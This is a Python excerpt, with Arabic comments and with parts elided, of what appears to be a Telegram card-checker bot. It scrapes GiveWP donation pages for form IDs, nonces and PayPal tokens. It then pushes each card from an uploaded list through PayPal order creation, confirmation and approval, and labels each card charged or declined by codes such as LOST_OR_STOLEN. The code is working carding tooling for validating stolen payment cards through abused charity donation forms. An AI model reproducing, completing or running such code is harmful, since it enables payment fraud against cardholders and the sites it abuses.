...
def extract_data(gate_key):
    ...
    try:
        # المحاولة الأولى: الوصول المباشر
        r = s.get(gate['site'], headers=headers, timeout=20)
        html_content = r.text
        
        # إذا كان هناك إعادة توجيه أو iframe لـ GiveWP
        if 'givewp-route=donation-form-view' in html_content and 'give-form-id' not in html_content:
            fid_match = re.search(r'form-id[=]+(\d+)', html_content)
            if fid_match:
                iframe_url = f"{gate['base']}/?givewp-route=donation-form-view&form-id={fid_match.group(1)}"
                r = s.get(iframe_url, headers=headers, timeout=20)
                html_content = r.text

        # استخراج البيانات الأساسية باستخدام Regex أكثر مرونة
        ...
        # محاولة بديلة لاستخراج ID إذا فشل الأول
        if not fi:
            fi = re.search(r'data-form-id="(.*?)"', html_content)
        ...
        if not enc:
            # محاولة البحث في كامل الصفحة عن التوكن
            enc = re.search(r'authorizationFingerprint":"(.*?)"', html_content)
            if not enc: return None
            at = enc.group(1)
        else:
            try:
                dec = base64.b64decode(enc.group(1)).decode('utf-8')
                at_match = re.search(r'"accessToken":"(.*?)"', dec)
                if not at_match: return None
                at = at_match.group(1)
            except: return None
            
        return {'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1), 'at': at, 'session': s}
    ...
    try:
        ...
        try:
            ...
            if not res_data.get('success'):
                return f"Order Failed | {res_data.get('data', 'Unknown Error')}"
            tok = res_data['data']['id']
        except:
            return f"Order Error | {r1.text[:50]}"
        ...
        r_confirm = s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=pp_headers, json=json_data, timeout=20)
        
        # 3. Approve Order
        r_approve = s.post(f"{gate['base']}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={tok}", headers=headers, data=mp, timeout=20)
        txt = r_approve.text
        
        if 'true' in txt or 'success' in txt: return 'Charged !'
        
        # تحليل الردود الشائعة
        for err in ['DO_NOT_HONOR', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE', 'INSUFFICIENT_FUNDS', 'GENERIC_DECLINE', 'TRANSACTION_REFUSED']:
            if err in txt or err in r_confirm.text: return f'Declined | {err}'
...
async def gate_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running, stop_requested, pending_data
    ...
    if data['type'] == 'card':
        ...
        await process_file(query.message, data['file_id'], data['name'], gate_key, query.from_user, context)
...
async def process_file(message, file_id, file_name, gate_key, user, context):
    ...
    for i, card in enumerate(cards, 1):
        ...
        if i % 5 == 0 or i == total:
            ...
            await status_msg.edit_text(
                ...
                f"━━━━━━━━━━━━━━\n"
                f"✅ مشحون: <code>{charged}</code>\n"
                f"❌ مرفوض: <code>{declined}</code>\n"
                f"🔄 متبقي: <code>{total - i}</code>\n"
                f"📈 التقدم: <code>{i}/{total}</code>\n"
                f"🎬 البار: <code>[{bar}]</code>\n"
                f"━━━━━━━━━━━━━━", parse_mode='HTML'
            )
